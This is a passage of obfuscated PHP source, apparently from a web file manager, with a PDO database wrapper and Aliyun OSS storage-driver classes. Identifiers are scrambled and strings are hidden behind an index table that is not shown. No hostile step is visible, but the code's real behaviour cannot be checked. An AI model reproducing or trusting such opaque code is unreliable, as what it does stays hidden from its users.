$€Î±ÅÖĞ[49]); return $this->error; } public function escapeString($ô˜û») { if ($this->_linkID) { return $this->_linkID->real_escape_string($ô˜û»); } else { return addslashes($ô˜û»); } } public function parseKey(&$ÆáÓÌş›, $’“’ÖçÃ = true) { $÷­â¾ŠÙ =& $_SERVER[ñ÷§¡å]; if ($’“’ÖçÃ) { $ÆáÓÌş› = $this->parseKeyCheck($ÆáÓÌş›); } if ($ÆáÓÌş› != $÷­â¾ŠÙ[198] && !preg_match($÷­â¾ŠÙ[918], $ÆáÓÌş›)) { $ÆáÓÌş› = $÷­â¾ŠÙ[394] . trim($ÆáÓÌş›, $÷­â¾ŠÙ[394]) . $÷­â¾ŠÙ[394]; } return $ÆáÓÌş›; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($‚õ÷„å’ = '') { $Æ­÷½ó¹ =& $_SERVER[ñ÷§¡å]; if (!class_exists($Æ­÷½ó¹[921])) { think_exception(think_lang($Æ­÷½ó¹[14]) . $Æ­÷½ó¹[922]); } if (!empty($‚õ÷„å’)) { $this->config = $‚õ÷„å’; if (empty($this->config[$Æ­÷½ó¹[17]])) { $this->config[$Æ­÷½ó¹[17]] = array(); } } } public function connect($¹âøÔôè = '', $«£Æ¿—à = 0) { $•ï´´Ã =& $_SERVER[ñ÷§¡å]; if (!isset($this->linkID[$«£Æ¿—à])) { if (empty($¹âøÔôè)) { $¹âøÔôè = $this->config; } $ş©°·Ëä = !empty($¹âøÔôè[$•ï´´Ã[17]][$•ï´´Ã[18]]) ? $¹âøÔôè[$•ï´´Ã[17]][$•ï´´Ã[18]] : $this->pconnect; if ($ş©°·Ëä) { $¹âøÔôè[$•ï´´Ã[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$«£Æ¿—à] = new PDO($¹âøÔôè[$•ï´´Ã[923]], $¹âøÔôè[$•ï´´Ã[895]], $¹âøÔôè[$•ï´´Ã[896]], $¹âøÔôè[$•ï´´Ã[17]]); } catch (PDOException $³«…©­¯) { think_exception($³«…©­¯->getMessage()); } $this->dbType = $this->_getDsnType($¹âøÔôè[$•ï´´Ã[923]]); if (in_array($this->dbType, array($•ï´´Ã[924], $•ï´´Ã[925], $•ï´´Ã[926], $•ï´´Ã[927]))) { think_exception($•ï´´Ã[928] . $this->dbType . $•ï´´Ã[929] . $this->dbType . $•ï´´Ã[930]); } if (!$this->linkID[$«£Æ¿—à]) { think_exception($•ï´´Ã[931]); } try { $this->linkID[$«£Æ¿—à]->exec($•ï´´Ã[932] . think_config($•ï´´Ã[898])); } catch (Exception $³«…©­¯) { } $this->connected = !0; if (1 != think_config($•ï´´Ã[22])) { unset($this->config); } } return $this->linkID[$«£Æ¿—à]; } public function free() { $this->PDOStatement = null; } public function query($ıÑîŞÉË, $­‡”¡ê = array()) { $şéŒŞ’… =& $_SERVER[ñ÷§¡å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ıÑîŞÉË; if (!empty($­‡”¡ê)) { $this->queryStr .= $şéŒŞ’…[933] . print_r($­‡”¡ê, !0) . $şéŒŞ’…[934]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($şéŒŞ’…[23], 1); think_status($şéŒŞ’…[24]); $this->PDOStatement = $this->_linkID->prepare($ıÑîŞÉË); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ªÎ—Ù´£ = $this->PDOStatement->execute($­‡”¡ê); $this->debug(); if (!1 === $ªÎ—Ù´£) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($€îãÃ¿, $àã‹¶Ë¶ = array()) { $…Á¢Æú =& $_SERVER[ñ÷§¡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $€îãÃ¿; if (!empty($àã‹¶Ë¶)) { $this->queryStr .= $…Á¢Æú[933] . print_r($àã‹¶Ë¶, !0) . $…Á¢Æú[934]; } $áÅÓöåç = !1; if ($this->dbType == $…Á¢Æú[927]) { if (preg_match($…Á¢Æú[935], $this->queryStr, $²ÑÂ€ŸÈ)) { $this->table = think_config($…Á¢Æú[936]) . str_ireplace(think_config($…Á¢Æú[937]), $…Á¢Æú[387], $²ÑÂ€ŸÈ[2]); $áÅÓöåç = (bool) $this->query($…Á¢Æú[938] . strtoupper($this->table) . $…Á¢Æú[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($…Á¢Æú[25], 1); think_status($…Á¢Æú[24]); $this->PDOStatement = $this->_linkID->prepare($€îãÃ¿); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¨ÄÑ¿É– = $this->PDOStatement->execute($àã‹¶Ë¶); $this->debug(); if (!1 === $¨ÄÑ¿É–) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($áÅÓöåç || preg_match($…Á¢Æú[939], $€îãÃ¿)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ïÇ­ÜœÒ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ïÇ­ÜœÒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÇØ•å½ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÇØ•å½) { $this->error(); return !1; } } return !0; } private function getAll() { $Æ¢ÚüÎ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Æ¢ÚüÎ); return $Æ¢ÚüÎ; } public function getFields($®À°¦É€) { $ôÅÊÙŸ‰ =& $_SERVER[ñ÷§¡å]; $this->initConnect(!0); if (think_config($ôÅÊÙŸ‰[940])) { $… è¾˜Ò = str_replace($ôÅÊÙŸ‰[941], $®À°¦É€, think_config($ôÅÊÙŸ‰[940])); } else { switch ($this->dbType) { case $ôÅÊÙŸ‰[924]: case $ôÅÊÙŸ‰[942]: $… è¾˜Ò = "\x53\105\114\105\103\x54\x20\40\x20\143\x6f\154\x75\x6d\156\137\156\x61\155\145\x20\141\x73\40\x27\x4e\x61\155\145\x27\54\x20\x20\x20\x64\x61\x74\x61\137\x74\171\160\x65\40\x61\163\x20\47\124\x79\160\x65\x27\x2c\40\40\40\143\157\x6c\x75\155\156\x5f\x64\145\146\141\x75\154\x74\x20\x61\163\x20\47\x44\145\x66\141\165\x6c\x74\x27\54\40\x20\40\151\x73\x5f\156\x75\154\x6c\x61\x62\154\x65\40\x61\163\x20\x27\116\165\x6c\x6c\x27\xa\x9\11\106\122\117\x4d\x9\151\156\x66\x6f\162\155\141\x74\151\x6f\156\137\x73\x63\150\x65\x6d\x61\x2e\164\141\142\x6c\x65\163\40\x41\123\x20\164\xa\x9\x9\x4a\117\x49\x4e\x9\151\x6e\x66\157\162\x6d\x61\164\x69\x6f\x6e\137\163\x63\150\x65\155\141\56\x63\157\x6c\165\x6d\156\163\40\101\x53\40\x63\12\x9\x9\117\116\x20\40\x74\56\x74\x61\142\x6c\145\x5f\143\x61\x74\141\154\157\x67\40\75\40\x63\x2e\x74\141\142\154\145\x5f\x63\141\164\141\x6c\x6f\x67\xa\11\x9\101\116\104\x20\x74\56\x74\141\142\154\x65\137\x73\143\x68\x65\155\141\x20\75\40\x63\x2e\164\x61\142\154\x65\x5f\x73\x63\150\145\x6d\141\xa\x9\x9\x41\116\104\40\164\x2e\x74\141\142\154\145\137\x6e\141\x6d\145\x20\75\x20\143\x2e\x74\141\x62\x6c\x65\x5f\156\x61\x6d\145\12\11\x9\127\110\105\122\105\40\x20\x20\164\56\x74\141\x62\154\x65\x5f\156\141\155\x65\40\75\40\x27{$®À°¦É€}\x27"; break; case $ôÅÊÙŸ‰[943]: $… è¾˜Ò = $ôÅÊÙŸ‰[944] . $®À°¦É€ . $ôÅÊÙŸ‰[945]; break; case $ôÅÊÙŸ‰[925]: case $ôÅÊÙŸ‰[927]: $… è¾˜Ò = $ôÅÊÙŸ‰[946] . $ôÅÊÙŸ‰[947] . $ôÅÊÙŸ‰[948] . strtoupper($®À°¦É€) . $ôÅÊÙŸ‰[949] . strtoupper($®À°¦É€) . $ôÅÊÙŸ‰[950]; break; case $ôÅÊÙŸ‰[951]: $… è¾˜Ò = $ôÅÊÙŸ‰[952] . $®À°¦É€ . $ôÅÊÙŸ‰[953]; break; case $ôÅÊÙŸ‰[926]: break; case $ôÅÊÙŸ‰[954]: default: $… è¾˜Ò = $ôÅÊÙŸ‰[955] . ($this->dbType == $ôÅÊÙŸ‰[954] ? "\140{$®À°¦É€}\x60" : $®À°¦É€); } } $ËŒ«ß¼Ğ = $this->query($… è¾˜Ò); $¿Á«® = array(); if ($ËŒ«ß¼Ğ) { foreach ($ËŒ«ß¼Ğ as $µûà‚¾² => $è½ Œı) { $è½ Œı = array_change_key_case($è½ Œı); $è½ Œı[$ôÅÊÙŸ‰[32]] = isset($è½ Œı[$ôÅÊÙŸ‰[32]]) ? $è½ Œı[$ôÅÊÙŸ‰[32]] : $ôÅÊÙŸ‰[387]; $è½ Œı[$ôÅÊÙŸ‰[33]] = isset($è½ Œı[$ôÅÊÙŸ‰[33]]) ? $è½ Œı[$ôÅÊÙŸ‰[33]] : $ôÅÊÙŸ‰[387]; $Ó×¡°³á = isset($è½ Œı[$ôÅÊÙŸ‰[282]]) ? $è½ Œı[$ôÅÊÙŸ‰[282]] : $è½ Œı[$ôÅÊÙŸ‰[32]]; $¿Á«®[$Ó×¡°³á] = array($ôÅÊÙŸ‰[32] => $Ó×¡°³á, $ôÅÊÙŸ‰[33] => $è½ Œı[$ôÅÊÙŸ‰[33]], $ôÅÊÙŸ‰[35] => (bool) (isset($è½ Œı[$ôÅÊÙŸ‰[113]]) && $è½ Œı[$ôÅÊÙŸ‰[113]] === $ôÅÊÙŸ‰[12] || isset($è½ Œı[$ôÅÊÙŸ‰[35]]) && $è½ Œı[$ôÅÊÙŸ‰[35]] === $ôÅÊÙŸ‰[12]), $ôÅÊÙŸ‰[37] => isset($è½ Œı[$ôÅÊÙŸ‰[37]]) ? $è½ Œı[$ôÅÊÙŸ‰[37]] : (isset($è½ Œı[$ôÅÊÙŸ‰[56]]) ? $è½ Œı[$ôÅÊÙŸ‰[56]] : $ôÅÊÙŸ‰[387]), $ôÅÊÙŸ‰[39] => isset($è½ Œı[$ôÅÊÙŸ‰[104]]) ? strtolower($è½ Œı[$ôÅÊÙŸ‰[104]]) == $ôÅÊÙŸ‰[41] : (isset($è½ Œı[$ôÅÊÙŸ‰[57]]) ? $è½ Œı[$ôÅÊÙŸ‰[57]] : !1), $ôÅÊÙŸ‰[42] => isset($è½ Œı[$ôÅÊÙŸ‰[956]]) ? strtolower($è½ Œı[$ôÅÊÙŸ‰[956]]) == $ôÅÊÙŸ‰[44] : (isset($è½ Œı[$ôÅÊÙŸ‰[104]]) ? $è½ Œı[$ôÅÊÙŸ‰[104]] : !1)); } } return $¿Á«®; } public function getTables($¹³Í¯Âê = '') { $°Û´æ’ =& $_SERVER[ñ÷§¡å]; if (think_config($°Û´æ’[957])) { $û¢À°’æ = str_replace($°Û´æ’[958], $¹³Í¯Âê, think_config($°Û´æ’[957])); } else { switch ($this->dbType) { case $°Û´æ’[925]: case $°Û´æ’[927]: $û¢À°’æ = $°Û´æ’[959]; break; case $°Û´æ’[924]: case $°Û´æ’[942]: $û¢À°’æ = $°Û´æ’[960]; break; case $°Û´æ’[951]: $û¢À°’æ = $°Û´æ’[961]; break; case $°Û´æ’[926]: think_exception(think_lang($°Û´æ’[962]) . $°Û´æ’[963]); break; case $°Û´æ’[943]: $û¢À°’æ = $°Û´æ’[45] . $°Û´æ’[46] . $°Û´æ’[47]; break; case $°Û´æ’[954]: default: if (!empty($¹³Í¯Âê)) { $û¢À°’æ = $°Û´æ’[906] . $¹³Í¯Âê . $°Û´æ’[907]; } else { $û¢À°’æ = $°Û´æ’[908]; } } } $¦—ŠÑÔÑ = $this->query($û¢À°’æ); $¤±—îŒ» = array(); foreach ($¦—ŠÑÔÑ as $ôóğÒ‚ => $È©•Ü‰¶) { $¤±—îŒ»[$ôóğÒ‚] = current($È©•Ü‰¶); } return $¤±—îŒ»; } protected function parseLimit($¿¼Ù¡½ó) { $ÚÛ¯­Õ =& $_SERVER[ñ÷§¡å]; $ÏÏº‰ñæ = $ÚÛ¯­Õ[12]; if (!empty($¿¼Ù¡½ó)) { switch ($this->dbType) { case $ÚÛ¯­Õ[951]: case $ÚÛ¯­Õ[943]: $¿¼Ù¡½ó = explode($ÚÛ¯­Õ[50], $¿¼Ù¡½ó); if (count($¿¼Ù¡½ó) > 1) { $ÏÏº‰ñæ .= $ÚÛ¯­Õ[51] . $¿¼Ù¡½ó[1] . $ÚÛ¯­Õ[52] . $¿¼Ù¡½ó[0] . $ÚÛ¯­Õ[53]; } else { $ÏÏº‰ñæ .= $ÚÛ¯­Õ[51] . $¿¼Ù¡½ó[0] . $ÚÛ¯­Õ[53]; } break; case $ÚÛ¯­Õ[924]: case $ÚÛ¯­Õ[942]: break; case $ÚÛ¯­Õ[926]: break; case $ÚÛ¯­Õ[925]: case $ÚÛ¯­Õ[927]: break; case $ÚÛ¯­Õ[954]: default: $ÏÏº‰ñæ .= $ÚÛ¯­Õ[51] . $¿¼Ù¡½ó . $ÚÛ¯­Õ[53]; } } return $ÏÏº‰ñæ; } public function parseKey(&$ë¿Ì§‘, $Ò¸á¹ˆ» = true) { $÷ŞÂä¬³ =& $_SERVER[ñ÷§¡å]; if ($Ò¸á¹ˆ») { $ë¿Ì§‘ = $this->parseKeyCheck($ë¿Ì§‘); } if ($this->dbType == $÷ŞÂä¬³[954]) { if ($ë¿Ì§‘ != $÷ŞÂä¬³[198] && !preg_match($÷ŞÂä¬³[918], $ë¿Ì§‘)) { $ë¿Ì§‘ = $÷ŞÂä¬³[394] . trim($ë¿Ì§‘, $÷ŞÂä¬³[394]) . $÷ŞÂä¬³[394]; } return $ë¿Ì§‘; } else { return parent::parseKey($ë¿Ì§‘, $Ò¸á¹ˆ»); } } public function close() { $this->_linkID = null; } public function error() { $øÖ‘—íÓ =& $_SERVER[ñ÷§¡å]; if ($this->PDOStatement) { $¯¸ıïè = $this->PDOStatement->errorInfo(); $this->error = $¯¸ıïè[1] . $øÖ‘—íÓ[4] . $¯¸ıïè[2]; } else { $this->error = $øÖ‘—íÓ[12]; } if ($øÖ‘—íÓ[12] != $this->queryStr) { $this->error .= LNG($øÖ‘—íÓ[48]) . $this->queryStr; } think_trace($this->error, $øÖ‘—íÓ[12], $øÖ‘—íÓ[49]); return $this->error; } public function escapeString($İÅ¨óÒ­) { $ø´ Â« =& $_SERVER[ñ÷§¡å]; switch ($this->dbType) { case $ø´ Â«[951]: case $ø´ Â«[924]: case $ø´ Â«[942]: case $ø´ Â«[954]: return addslashes($İÅ¨óÒ­); case $ø´ Â«[926]: case $ø´ Â«[943]: case $ø´ Â«[925]: case $ø´ Â«[927]: return str_ireplace($ø´ Â«[58], $ø´ Â«[59], $İÅ¨óÒ­); } } protected function parseValue($¥™Ëá¤) { $»’¨™Ã¼ =& $_SERVER[ñ÷§¡å]; if (is_string($¥™Ëá¤)) { $ÔéìÃµó = strpos($¥™Ëá¤, $»’¨™Ã¼[4]) === 0 && in_array($¥™Ëá¤, array_keys($this->bind)); $¥™Ëá¤ = $ÔéìÃµó ? $this->escapeString($¥™Ëá¤) : $»’¨™Ã¼[964] . $this->escapeString($¥™Ëá¤) . $»’¨™Ã¼[964]; } elseif (isset($¥™Ëá¤[0]) && is_string($¥™Ëá¤[0]) && strtolower($¥™Ëá¤[0]) == $»’¨™Ã¼[306]) { $¥™Ëá¤ = $this->escapeString($¥™Ëá¤[1]); } elseif (is_array($¥™Ëá¤)) { $¥™Ëá¤ = array_map(array($this, $»’¨™Ã¼[965]), $¥™Ëá¤); } elseif (is_bool($¥™Ëá¤)) { $¥™Ëá¤ = $¥™Ëá¤ ? $»’¨™Ã¼[98] : $»’¨™Ã¼[207]; } elseif (is_null($¥™Ëá¤)) { $¥™Ëá¤ = $»’¨™Ã¼[113]; } return $¥™Ëá¤; } public function getLastInsertId() { $³ûßğ =& $_SERVER[ñ÷§¡å]; switch ($this->dbType) { case $³ûßğ[951]: case $³ûßğ[943]: case $³ûßğ[924]: case $³ûßğ[942]: case $³ûßğ[926]: case $³ûßğ[954]: return $this->_linkID->lastInsertId(); case $³ûßğ[925]: case $³ûßğ[927]: $¦öâŒİñ = $this->table; $ªÀ¾’È¸ = $this->query("\x53\x45\x4c\x45\x43\x54\x20{$¦öâŒİñ}\56\x63\x75\162\162\x76\141\154\40\143\x75\162\162\x76\x61\x6c\40\106\x52\x4f\115\x20\144\165\x61\x6c"); return $ªÀ¾’È¸ ? $ªÀ¾’È¸[0][$³ûßğ[966]] : 0; } } } goto DÂ·‘Ş¨’î; Dİò¡È›é–: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($’ô‹ˆÖ) { parent::__construct($’ô‹ˆÖ); $this->signatureVersion($_SERVER[ñ÷§¡å][226]); } public function fileOutLink($ØÆº”³) { $ğ«Ç‘Ú =& $_SERVER[ñ÷§¡å]; if (substr($ØÆº”³, 0, 7) == $ğ«Ç‘Ú[1332]) { $ØÆº”³ = $ğ«Ç‘Ú[1333] . substr($ØÆº”³, 7); } header($ğ«Ç‘Ú[171] . $ØÆº”³); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($¸Œšàò) { parent::__construct(); include_once SDK_DIR . $_SERVER[ñ÷§¡å][1389]; $this->_init($¸Œšàò); } public function _init($‚î¦öğ) { $öŒıÇ“Î =& $_SERVER[ñ÷§¡å]; foreach ($‚î¦öğ as $†‡İ˜àê => $ˆÑ–„°) { if (isset($this->{$†‡İ˜àê})) { $this->{$†‡İ˜àê} = $ˆÑ–„°; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($öŒıÇ“Î[1390] . LNG($öŒıÇ“Î[1391])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¤Û·Í†Å =& $_SERVER[ñ÷§¡å]; $¬½—â› = new OSS\Model\CorsConfig(); $™“ÇŒÈ = new OSS\Model\CorsRule(); $™“ÇŒÈ->addAllowedOrigin($¤Û·Í†Å[1392]); $™“ÇŒÈ->addAllowedMethod($¤Û·Í†Å[1393]); $™“ÇŒÈ->addAllowedMethod($¤Û·Í†Å[1394]); $™“ÇŒÈ->addAllowedMethod($¤Û·Í†Å[1395]); $™“ÇŒÈ->addAllowedMethod($¤Û·Í†Å[1396]); $™“ÇŒÈ->addAllowedMethod($¤Û·Í†Å[170]); $™“ÇŒÈ->setMaxAgeSeconds(600); $™“ÇŒÈ->addExposeHeader($¤Û·Í†Å[1397]); $™“ÇŒÈ->addAllowedHeader($¤Û·Í†Å[1392]); $¬½—â›->addRule($™“ÇŒÈ); try { $this->client->putBucketCors($this->bucket, $¬½—â›); } catch (OSS\Core\OssException $º†‡‘¤§) { return !1; } return !0; } public function getBucketCors() { $À•†‰Ú =& $_SERVER[ñ÷§¡å]; $à©Œîëı = null; try { $à©Œîëı = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÉÉôéÈ¦) { return null; } if (!$à©Œîëı || !($ÎØŸĞÖï = $à©Œîëı->getRules())) { return null; } $‰ü¬Úî = $ÎØŸĞÖï[0]->getAllowedOrigins(); $›ÑÌÈÈò = $ÎØŸĞÖï[0]->getAllowedMethods(); $ºìçˆ½‹ = $ÎØŸĞÖï[0]->getMaxAgeSeconds(); $Ö¤­†šè = $ÎØŸĞÖï[0]->getExposeHeaders(); $òš´ÑŒ = $ÎØŸĞÖï[0]->getAllowedHeaders(); return array($À•†‰Ú[197] => isset($‰ü¬Úî[0]) ? $‰ü¬Úî[0] : $À•†‰Ú[12], $À•†‰Ú[201] => $›ÑÌÈÈò, $À•†‰Ú[1398] => $ºìçˆ½‹, $À•†‰Ú[1399] => isset($Ö¤­†šè[0]) ? $Ö¤­†šè[0] : $À•†‰Ú[12], $À•†‰Ú[199] => isset($òš´ÑŒ[0]) ? $òš´ÑŒ[0] : $À•†‰Ú[12]); } public function isBucketCors() { $ê‰À‘æõ =& $_SERVER[ñ÷§¡å]; $Ã¡ÈÎê¡ = $this->getBucketCors(); if (!$Ã¡ÈÎê¡ || !is_array($Ã¡ÈÎê¡)) { return !1; } if ($Ã¡ÈÎê¡[$ê‰À‘æõ[197]] != $ê‰À‘æõ[198] || $Ã¡ÈÎê¡[$ê‰À‘æõ[199]] != $ê‰À‘æõ[198]) { return !1; } $™ÙÒ£®‡ = array_map($ê‰À‘æõ[200], $Ã¡ÈÎê¡[$ê‰À‘æõ[201]]); if (!is_array($™ÙÒ£®‡)) { $™ÙÒ£®‡ = array(); } $Ñ×æ = array($ê‰À‘æõ[202], $ê‰À‘æõ[203], $ê‰À‘æõ[204], $ê‰À‘æõ[205], $ê‰À‘æõ[206]); $ ßªö«Í = array_diff($Ñ×æ, $™ÙÒ£®‡); return empty($ ßªö«Í); } public function mkfile($‹Àêİ™È, $œÒŠÔ•æ = '', $Ú¼İËóè = REPEAT_RENAME) { $Ç„¸Œ¿ = $this->setContent($‹Àêİ™È, $œÒŠÔ•æ); if ($Ç„¸Œ¿ !== !1) { return $this->getPathOuter($‹Àêİ™È); } return !1; } public function mkdir($Öİñ²ø, $¥Øù³ëê = REPEAT_SKIP) { if ($¥Øù³ëê && $this->_isFolder($Öİñ²ø)) { return $this->getPathOuter($Öİñ²ø); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Öİñ²ø)); } catch (OSS\Core\OssException $¶ÌıÄøë) { return !1; } return $this->getPathOuter($Öİñ²ø); } private function fileList($Ñ×á„ıÉ, $ÕœäØ = '', $‚»‹£Îœ = 0) { $üÕëš´“ =& $_SERVER[ñ÷§¡å]; $Ñ×á„ıÉ = trim($Ñ×á„ıÉ, $üÕëš´“[8]); $‹±šè¨ = empty($Ñ×á„ıÉ) && $Ñ×á„ıÉ !== $üÕëš´“[207] ? $üÕëš´“[12] : $Ñ×á„ıÉ . $üÕëš´“[8]; $±Ş”„Âî = $üÕëš´“[12]; $Şì¬Ü‰‚ = 1000; $Ê»éÌë˜ = $ä —ç»– = array(); while (!0) { check_abort(); $÷ïç–¢å = array($üÕëš´“[1400] => $ÕœäØ, $üÕëš´“[1401] => $‹±šè¨, $üÕëš´“[1402] => $Şì¬Ü‰‚, $üÕëš´“[1403] => $±Ş”„Âî); try { $š†®¢ƒ = $this->client->listObjects($this->bucket, $÷ïç–¢å); } catch (OSS\Core\OssException $ëÓô±ù) { break; } $±Ş”„Âî = $š†®¢ƒ->getNextMarker(); $ßè‰ñŞ™ = $š†®¢ƒ->getObjectList(); $ê©²®« = $š†®¢ƒ->getPrefixList(); foreach ($ßè‰ñŞ™ as $Ú˜Ñõ½) { if ($Ú˜Ñõ½->getKey() == $‹±šè¨) { continue; } $œ¯²Ìº = $Ú˜Ñõ½->getKey(); $ÇÅÍÌÙ« = $Ú˜Ñõ½->getSize(); $Ä˜®¸¢å = $Ú˜Ñõ½->getLastModified(); $ò‹ĞË‘ş = $‚»‹£Îœ ? array($üÕëš´“[32] => $œ¯²Ìº, $üÕëš´“[86] => $ÇÅÍÌÙ«, $üÕëš´“[213] => strtotime($Ä˜®¸¢å)) : $œ¯²Ìº; $¥ºÁƒÃ = $ÇÅÍÌÙ« == 0 && substr($œ¯²Ìº, strlen($œ¯²Ìº) - 1, 1) == $üÕëš´“[8] ? !0 : !1; $Ÿ¡ÜÀ = array($üÕëš´“[86] => $ÇÅÍÌÙ«, $üÕëš´“[1404] => $ÇÅÍÌÙ«, $üÕëš´“[95] => strtotime($Ä˜®¸¢å), $üÕëš´“[1405] => $Ä˜®¸¢å); $this->cacheMethodInfoSet($œ¯²Ìº, $¥ºÁƒÃ, $Ÿ¡ÜÀ); if ($¥ºÁƒÃ) { $Ê»éÌë˜[] = $œ¯²Ìº; continue; } $ä —ç»–[] = $ò‹ĞË‘ş; } foreach ($ê©²®« as $‚ı±¬“é) { $Ê»éÌë˜[] = $‚ı±¬“é->getPrefix(); $this->cacheMethodInfoSet($‚ı±¬“é->getPrefix(), !0); } if ($±Ş”„Âî === $üÕëš´“[12]) { break; } } $this->cacheMethodInfoSet($Ñ×á„ıÉ, !0); return array($üÕëš´“[92] => $Ê»éÌë˜, $üÕëš´“[93] => $ä —ç»–); } public function copyFile($Ò…†Æ¶, $±Ô¦©) { $¾·ÏĞôŞ = $this->size($Ò…†Æ¶); if ($¾·ÏĞôŞ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ò…†Æ¶, $this->bucket, $this->pathEncode($±Ô¦©)); } catch (OSS\Core\OssException $çÊ•úà) { return !1; } return $this->getPathOuter($±Ô¦©); } $æà±¶Ä = $this->multiCopyObject($Ò…†Æ¶, $±Ô¦©, $¾·ÏĞôŞ); return $æà±¶Ä ? $this->getPathOuter($±Ô¦©) : !1; } private function multiCopyObject($…¡Ù•Ÿ, $Í¨á©Ê­, $šöÀü¶) { $»†ş¾¶¾ =& $_SERVER[ñ÷§¡å]; try { $Òí¬Îş = array(); if ($´ñòŒéú = $this->hashMd5($…¡Ù•Ÿ)) { $Òí¬Îş = array(OSS\OssClient::OSS_HEADERS => array($»†ş¾¶¾[1406] => $´ñòŒéú)); } $£Ö©óŠ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Í¨á©Ê­), $Òí¬Îş); $’È¹áåí = 1; $ıÊöÖß‘ = 0; $şşˆúÉÃ = array(); $®®úÙñœ = 1024 * 1024 * 10; $–®ò‹Øß = $this->client->generateMultiuploadParts($šöÀü¶, $®®úÙñœ); foreach ($–®ò‹Øß as $Ãé°—ã¶ => $×˜´Æ¦Ç) { $îğä¶®Ã = $ıÊöÖß‘ + (int) $×˜´Æ¦Ç[$»†ş¾¶¾[1407]]; $´„½íÒ = (int) $×˜´Æ¦Ç[$»†ş¾¶¾[346]] + $îğä¶®Ã - 1; $É†£ƒò = array($»†ş¾¶¾[1408] => $îğä¶®Ã, $»†ş¾¶¾[1409] => $´„½íÒ); $şşˆúÉÃ[] = $this->client->uploadPartCopy($this->bucket, $…¡Ù•Ÿ, $this->bucket, $this->pathEncode($Í¨á©Ê­), $’È¹áåí, $£Ö©óŠ, $É†£ƒò); $’È¹áåí = $’È¹áåí + 1; } $‹ùÁŸí­ = array(); foreach ($şşˆúÉÃ as $Ãé°—ã¶ => $¹˜í®Ûô) { $‹ùÁŸí­[] = array($»†ş¾¶¾[1410] => $Ãé°—ã¶ + 1, $»†ş¾¶¾[1411] => $¹˜í®Ûô); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Í¨á©Ê­), $£Ö©óŠ, $‹ùÁŸí­); } catch (OSS\Core\OssException $ïÌÑÎ”û) { return !1; } return !0; } public function moveFile($·ÙÓö¤, $Şƒè¸½Ğ) { if ($this->copyFile($·ÙÓö¤, $Şƒè¸½Ğ)) { $this->remove($·ÙÓö¤); return $this->getPathOuter($Şƒè¸½Ğ); } return !1; } public function delFile($ûŞ¬à’¸) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ûŞ¬à’¸)); } catch (OSS\Core\OssException $çíé¯î) { return !1; } return !0; } public function delFolder($±Íœ­ç) { $ç¨´íË× =& $_SERVER[ñ÷§¡å]; if (!$this->exist($±Íœ­ç)) { return !0; } $this->listItemCache = !1; $¸Œ˜ÜË˜ = $this->fileList($±Íœ­ç); $this->listItemCache = !0; $í¬ûÖ»ç = trim($±Íœ­ç, $ç¨´íË×[8]) . $ç¨´íË×[8]; if (!empty($±Íœ­ç) && $±Íœ­ç !== $ç¨´íË×[207] && !in_array($í¬ûÖ»ç, $¸Œ˜ÜË˜[$ç¨´íË×[92]])) { $¸Œ˜ÜË˜[$ç¨´íË×[92]][] = $í¬ûÖ»ç; } $ù¨ô­¨¤ = $this->delByBatch($¸Œ˜ÜË˜[$ç¨´íË×[93]]); if (!$ù¨ô­¨¤) { return !1; } $ù¨ô­¨¤ = $this->delByBatch($¸Œ˜ÜË˜[$ç¨´íË×[92]]); if (!$ù¨ô­¨¤) { return !1; } return $this->delFile($í¬ûÖ»ç); } private function delByBatch($§½®‡º) { foreach (array_chunk($§½®‡º, 1000) as $ûìÂö¥–) { try { $this->client->deleteObjects($this->bucket, $ûìÂö¥–); } catch (OSS\Core\OssException $­¤İ¿®±) { return !1; } } return !0; } public function rename($¬éÊ¾áª, $¤šñîÓ) { return $this->renameObject($¬éÊ¾áª, $¤šñîÓ); } private function fileInfo($ú¸Û½Äù, $šË¯œÉÒ = false, $Ù¡‹õ¬ = array()) { $õİ‹§¶š =& $_SERVER[ñ÷§¡å]; $öşñ¼ĞÃ = array($õİ‹§¶š[32] => $this->pathThis($ú¸Û½Äù), $õİ‹§¶š[94] => $this->getPathOuter($ú¸Û½Äù), $õİ‹§¶š[33] => $õİ‹§¶š[209], $õİ‹§¶š[86] => isset($Ù¡‹õ¬[$õİ‹§¶š[86]]) ? $Ù¡‹õ¬[$õİ‹§¶š[86]] : 0, $õİ‹§¶š[184] => $this->ext($ú¸Û½Äù)); if ($šË¯œÉÒ) { return $öşñ¼ĞÃ; } $öşñ¼ĞÃ[$õİ‹§¶š[210]] = $öşñ¼ĞÃ[$õİ‹§¶š[95]] = 0; $öşñ¼ĞÃ[$õİ‹§¶š[211]] = $öşñ¼ĞÃ[$õİ‹§¶š[212]] = !0; if 